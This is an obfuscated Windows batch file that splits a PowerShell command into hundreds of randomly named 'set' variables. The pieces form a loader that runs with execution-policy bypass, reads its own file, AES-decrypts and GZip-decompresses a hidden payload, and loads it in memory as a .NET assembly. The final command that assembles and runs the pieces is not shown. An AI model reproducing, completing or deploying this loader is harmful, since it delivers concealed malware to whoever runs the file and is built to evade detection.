@echo off
set "IVECkviPDF=:: '"
set "KlYZrHiPdz=Ae);"
set "udvUbekebv=ose("
set "HjzvspTIpf=tyDM"
set "suoFOublXt=stem"
set "iiNuAWohKD== [S"
set "dyOpVRtQnp=tyDM"
set "HoFAPaXiTX=gMod"
set "nNjhvxJfHT=$gTC"
set "TVaRAhIDlK=Bmor"
set "bJPkyWzgax=nirt"
set "LkvhnzTVmt=gjYA"
set "cZcQiwFHsB=tS46"
set "aYFICcLzkI=PxEW"
set "RGvSMhAfKA=$QyQ"
set "clYxZzmxpn=s75K"
set "MmwuUFpMxX=n ''"
set "gJecqsnkeC=CeyW"
set "hQeoSKRfNh=ptor"
set "OgsRYXeVxJ=NQ, "
set "DZcgVOJIwn=dcyD"
set "ULQJiJIRtC=raph"
set "nTCsxOxZNN=ptog"
set "AsaKckvOLv=zHhH"
set "jBRCOLyAXN=sbmq"
set "VaQmybVYxr=ew-O"
set "uhSzhRzlNO=-Obj"
set "zSmAbPHlLZ=;$gT"
set "mdmtzfqguS=ct S"
set "DcnupMByfp=bypa"
set "LlTIVsfcZM== $L"
set "QovNQuHJVk=ay()"
set "sEMfiYcXUR=-ep "
set "MElhYPqfxL=grap"
set "mXBMfAJqim=join"
set "RGCfVKLVPj=('Tg"
set "odMmpmFzhw= = $"
set "qiTpIeeGva=oryS"
set "CosZeBrtfg=pres"
set "yiaKaoBdWa= = ["
set "ZEUvrvSKxk=Obje"
set "AuNFfBTmsw=yWs "
set "ympVHcNFzT=QW);"
set "RpQauPkScB=oin "
set "yiWhSTnRAB=JJQW"
set "fdRhXzBOij=PKCS"
set "pmttybEoKL=Comp"
set "tbuNVOOxrH=.Cre"
set "zeUYGpuZqB=Usbm"
set "oOYhgjUNoL=em.I"
set "kIfmlqzpqS=rity"
set "tMDEMUiJAm=yste"
set "dRNFOwmiuG=comp"
set "oKqmsqPIzJ=CZd."
set "jKIrHhDkto=ewLi"
set "GPfJsIngTn=);$H"
set "gOuxOtBtmI=e = "
set "KRZrAFsSHZ=;$Dc"
set "dVnhjOYlVI=);$Q"
set "mYjtmMfXxr=tem."
set "hxqCsIDkxl=esMa"
set "kdTREBjGdF=Q = "
set "DgtiipaXrS=orF'"
set "bUPhgMzjIE=).Sp"
set "kJVAXgsdYe=Ae.T"
set "pfYTTNTgNx=AcFF"
set "TaIDpUPjeb=.IO."
set "gtydAXlwbV=ecry"
set "NlTYeQcfiL=ss -"
set "DNjjflSSLx=dj0C"
set "MTalZSiBwS=ionM"
set "hLSulbzttm=CZd "
set "mucUmmKjiy=ne);"
set "uRIXrNlTEB=ress"
set "IHByutNnEF=F'[-"
set "bzSHrQzkVc=YxVw"
set "XMjcEoFHNL=morF"
set "hARPElmpTW=rans"
set "QLnxOqQZmU=6] -"
set "DIKsvGbMso=();$"
set "RHJLFkPpQP=.Dis"
set "zNJdzHdCUI=Stre"
set "KmZrKSvwae=esaB"
set "WxFclHbISG=.Len"
set "kNuvDDtHkd=();$"
set "dRECBDTXhV=raph"
set "LNgDMMVslC=[]] "
set "rhhweJrDHv=vert"
set "nPHFAUFGtC=y.Pa"
set "YhfVFlpvln=.Dis"
set "KKoUrfCZdY= = $"
set "rfkktYEozF=yQAe"
set "TKLFCcYgFb=lit("
set "CYyBMqBKtu=cyD."
set "bPuNkOCXjI=('%~f0'"
set "ixmBqkLLlN=yste"
set "KPhJHqrMCJ=Syst"
set "oQjQHRvavi=[IO."
set "rXGsKzKjwP=V = "
set "uJPvEsOKDg=TllA"
set "jbhskSkddm=CFxo"
set "qRDnkImdSB=Star"
set "vbJbRLYTsh=ect "
set "KScbeLJlKP=ptog"
set "AMkXkntHlm=bjec"
set "HNPUqvhnQf=olF "
set "AbIzwKfxJJ=l5E7"
set "zyOwJpShgr=$QyQ"
set "SvgEzvmBBY=tJJQ"
set "CyIyAMzgAd=pose"
set "GuwFkSOMar=nage"
set "wmLyxddyfR=106u"
set "GabuYVaKuG=);$U"
set "hEfHriNbyi=-joi"
set "kBLZrZWMCf=('da"
set "YxpdnqdpmN=::('"
set "IxJYTxTpRH=tsWi"
set "EiJNKWzVui=brea"
set "WCPBEoaftp=();$"
set "RVgUwVBuOf=hy.A"
set "cjfjQSGtUd=]::("
set "ZPiQPdCBLL=rt]:"
set "OKLATXjaEF='txe"
set "qSluBewHfB=ach "
set "VyeNzkwOoS=Zd.T"
set "jrDaHpKrgA=ion."
set "zHSDIQuBZO===')"
set "TdRSiiLWMl=ress"
set "BQYTameAhw=le  "
set "lAoJpcTMgC= New"
set "EfXKflgIRT=tem."
set "FPSQazFXnv=1..-"
set "dzOKWQAWqv=olF."
set "QdeGKAsHzf=BGmE"
set "nltSMaDbPG=gsYZ"
set "xaTYhITtIh=y.Cr"
set "rMnwCArXyQ=Ae ="
set "FRQrqhXRpP=ypto"
set "RcSSvBootf=Invo"
set "VutWOaQYJY=.Sec"
set "qwJubenIWp=Fina"
set "yIhOAwDtNN=yste"
set "AEmZCtRDSe=-1.."
set "xUdzVWhuBj=$tJJ"
set "KKlsIqEqpW= [Sy"
set "vMKaAdcZJG=.Com"
set "wfbemmeSPD=LNQ."
set "fLkkCoilSt=eMVs"
set "HMUyncQtHS=yTo("
set "MbqycHMwUM==');"
set "PvshrsXXsJ=]::N"
set "YEsETCCQNo=W, 0"
set "pLFkrlwyPi=;$gT"
set "IMnKSVOLjW=Disp"
set "pQaDxwNlan=.GZi"
set "SVhocxtgeY=th('"
set "vxzvddrHMf=embl"
set "OXQHxDgOAy=oL'["
set "iBPdkSCmQe=rofi"
set "nJWKXvOUgF=ispo"
set "GCpFbwQVaP=zOol"
set "BLpPCgHWjn=)($T"
set "jSTQpdHCRU=stem"
set "ZJvfgSxMJG=W = "
set "gQSThtvVHq=Mode"
set "jFLkxooGrC= '')"
set "KhSZbJNnUB=form"
set "GMyHzlKvcJ=PTtG"
set "HwXJbNmRnL=em.C"
set "CrOeQCDVfy=t Sy"
set "BNEAbOxcvk=onve"
set "IKrcpEpouQ=1] -"
set "wBNNxslodw=$QyQ"
set "mcOfIckrIn=:('g"
set "GDcjIooJOp=tyDM"
set "mQKNKXLHys=tyDM"
set "PkhPfMQtRw=ing("
set "PdxKcqDmLZ=.-16"
set "fUiOrLnOCI=$DcL"
set "RYUGfLTvSL=join"
set "hjCXuDxxCp=.Key"
set "wraUzfwvce=Secu"
set "ZQWSrAyeeK=);$L"
set "UHgdCEQzgR=m.IO"
set "LTEQplHwPu=F.Su"
set "KvWLddwZeH=..-1"
set "dqLkZUkxBj=e]::"
set "XkzEltbKci='gni"
set "lumLiOFeLP=ck($"
set "qJWRPxCOBr=[Env"
set "DwAnAXcpGQ=[-1."
set "JgzJqEXiRU=sion"
set "HbZiXaFNbS=-nop"
set "afkKukRnRE=O.Me"
set "CAPqskGVMl=);$L"
set "gBOalkuBrK=('%*'"
set "rxuWhkMKrc=New-"
set "tZqPgMSNEy=]::C"
set "pjuxgcKmzS=daeR"
set "mVZJyYwwXl=QW ="
set "MKdtkTyStq=bstr"
set "JaVNfDaURL=..-1"
set "tlpMowKFkr=ose("
set "WDOXaNmnWq=ke($"
set "nPSbFtrbWG=DM.I"
set "OuKKqWkYln=, $t"
set "kbIANuxXIo=BC;$"
set "LNmsUDiytu='0Pg"
set "dxEBqQlAKx=6esa"
set "VymsYPQAtB=g = "
set "dZtZREajSQ=mory"
set "PrjAZRDDAC=s.En"
set "iumbZLAqFs=RmAx"
set "sAEqmgfCak=ress"
set "wJSbjAIJfS='')("
set "wOryGtnCKq=zuZI"
set "VeSfrsldNY=mq.D"
set "rEiQwFJhHv=LtyD"
set "PeYMJrdPkh=ment"
set "VWPjVyxIUM=EP ="
set "iXdflCdref=P) {"
set "NSvWUvtxVe=($zO"
set "QEsZAyDEDn=and "
set "NaWTlUbNbV= = N"
set "tEagqgUDQc=ct S"
set "xlZlmMwnGb=.Mem"
set "zTaznrjjYt='[-1"
set "nyBUZqKNWt=stem"
set "faJkoCSLVc=m.IO"
set "UCgEcJRzfQ=Disp"
set "WPPIoYkhQz=7;$L"
set "cKfjUAnGGL=[Sys"
set "XxMwyASfQz=tyDM"
set "nQqwexuVjE=]::("
set "rNVWqKKVUv=d;$L"
set "bGkEBRmZeI=tion"
set "JdGbmIruJx=Syst"
set "eltOCZkBAZ= [st"
set "fKHeJeFnnB=pose"
set "XobiNfxExJ=)))"
set "TaqhVvYaOb=se()"
set "XiRaOjRUYB= if "
set "wjUNBKQxOA=tJJQ"
set "gocUgUVaPD=oint"
set "RIlhVCeYGR=Obje"
set "uDWpMGAufj=$tJJ"
set "iBZEpgIFqx=16] "
set "tNDuBBuZjS=fore"
set "sCGIxRKbmg=DcLN"
set "qvqOzmioCL=gnir"
set "bFzkseirgM=ddin"
set "fmEPZbQJrC=.Cry"
set "loZyyRnhTY=S46e"
set "wNqTKhPBiQ=null"
set "mxuZhombKW=eam("
set "WaDNZwHtpL=$Usb"
set "ylBumwAQIo=m.Re"
set "vBbPOYEvrn=y.Ci"
set "XJCXLdvTMS=[Sys"
set "CJGQwvWfhW=-joi"
set "iLVxmnwhkN=q = "
set "bIwREkmRAe=rtS4"
set "DeukOpOUia=;$Ce"
set "RlEHgFFwox=am;$"
set "XanbTfVRqj=] -j"
set "cXVeSdckQb=n ''"
set "lPrxbbzjwF=gth)"
set "RBLuAWoTgm=.Cry"
set "JWvmYEnVpB=ert]"
set "fEJVMSbWSu=y]::"
set "azoTaTsdJC=pher"
set "RDpQusGdhz=ddin"
set "xXAkuBPyZB= '')"
set "XAyEXWHsid=.Ass"
set "ByDUxtANUz=;$Hd"
set "bVJRqTbAsz=File"
set "DlgMkghlSk=ode]"
